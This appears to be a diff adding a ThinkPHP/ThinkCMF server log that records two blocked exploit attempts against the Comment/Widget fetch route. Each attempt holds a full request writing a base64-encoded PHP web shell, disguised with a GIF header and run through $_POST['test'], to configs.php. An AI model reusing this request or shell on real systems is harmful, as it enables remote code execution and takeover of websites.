@@ -1,0 +1,22 @@
+[ 2020-06-09T07:06:41+08:00 ] 58.51.201.187 /index.php?g=Comment&m=Widget&a=fetch&templateFile=/../public/index&prefix=''&content=%3Cphp%3Efile_put_contents('configs.php',base64_decode('R0lGODlhPD9waHAKY2xhc3MgS0ZIUnsKICAgIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXsKICAgICAgICAkRkpaUj0nUHdDcn1Nc2dKWHwjXiFOJ14iXHgzM1x4NVx4MjZceDEzXHg5XHgyOFx4MmNceDFceDNmXHgzNlx4MWZceDU3XHgzN1x4NGVceDIwIjsKICAgICAgICBAJEZKWlI9JEZKWlIoJycsJHRoaXMtPkhWRkIpOwogICAgICAgIHJldHVybiBAJEZKWlIoKTsKICAgIH0KfQoka2Zocj1uZXcgS0ZIUigpOwpAJGtmaHItPkhWRkI9JiRfUE9TVFsndGVzdCddOwo/Pg=='));%3C/php%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.000872s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001141s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000327s ]
+INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000380s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000770s ]
+ERR: 非法操作:fetch
+
+[ 2020-06-09T07:06:41+08:00 ] 58.51.201.187 /index.php?g=Comment&m=Widget&a=fetch&templateFile=/../data/index&prefix=''&content=%3Cphp%3Efile_put_contents('configs.php',base64_decode('R0lGODlhPD9waHAKY2xhc3MgS0ZIUnsKICAgIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXsKICAgICAgICAkRkpaUj0nUHdDcn1Nc2dKWHwjXiFOJ14iXHgzM1x4NVx4MjZceDEzXHg5XHgyOFx4MmNceDFceDNmXHgzNlx4MWZceDU3XHgzN1x4NGVceDIwIjsKICAgICAgICBAJEZKWlI9JEZKWlIoJycsJHRoaXMtPkhWRkIpOwogICAgICAgIHJldHVybiBAJEZKWlIoKTsKICAgIH0KfQoka2Zocj1uZXcgS0ZIUigpOwpAJGtmaHItPkhWRkI9JiRfUE9TVFsndGVzdCddOwo/Pg=='));%3C/php%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.000875s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001300s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000339s ]
+INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000398s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000786s ]
+ERR: 非法操作:fetch
+
